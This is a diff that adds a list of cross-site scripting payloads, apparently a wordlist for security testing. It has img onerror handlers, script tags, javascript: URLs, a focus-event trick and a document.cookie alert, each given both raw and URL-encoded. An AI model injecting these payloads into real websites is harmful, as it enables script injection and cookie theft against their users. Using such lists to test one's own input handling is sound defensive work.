@@ -1,0 +1,28 @@
+<img src=x onerror=alert('xssHacked');>
+<img src/onerror=prompt('xssHacked')>Test
+<img src/onerror=prompt('xssHacked')>
+test	<img src=0 onerror=alert('xssHacked')>
+test<img src=0 onerror=alert('xssHacked')>
+<p>Example content</p><p><img src=0 onerror=alert('xssHacked')></p>
+<p><img src=0 onerror=alert('xssHacked')></p>
+<img src=0 onerror=alert('xssHacked')>
+<script>alert('xssHacked')</script>
+<script>alert('xssHacked<FieldName>')</script>
+<script>alert(document.cookie)</script>
+javascript:alert('xssHacked')//
+javascript:alert('Current domain: ' + document.domain);
+<script onfocusout=alert('xssHackedPosition') autofocus tabindex=1 style=display:block>test</script><input value=clickme>
+%3Cimg%20src=x%20onerror=alert('xssHacked');%3E
+%3Cimg%20src/onerror=prompt('xssHacked')%3ETest
+%3Cimg%20src/onerror=prompt('xssHacked')%3E
+test%09%3Cimg%20src=0%20onerror=alert('xssHacked')%3E
+test%3Cimg%20src=0%20onerror=alert('xssHacked')%3E
+%3Cp%3EExample%20content%3C/p%3E%3Cp%3E%3Cimg%20src=0%20onerror=alert('xssHacked')%3E%3C/p%3E
+%3Cp%3E%3Cimg%20src=0%20onerror=alert('xssHackedh')%3E%3C/p%3E
+%3Cimg%20src=0%20onerror=alert('xssHacked')%3E
+%3Cscript%3Ealert('xssHacked')%3C/script%3E
+%3Cscript%3Ealert('xssHacked%3CFieldName%3E')%3C/script%3E
+%3Cscript%3Ealert(document.cookie)%3C/script%3E
+javascript%3aalert('xssHacked')%2f%2f
+javascript:alert('Current%20domain:%20'%20+%20document.domain);
+%3Cscript%20onfocusout=alert('xssHacked')%20autofocus%20tabindex=1%20style=display:block%3Etest%3C/script%3E%3Cinput%20value=clickme%3E
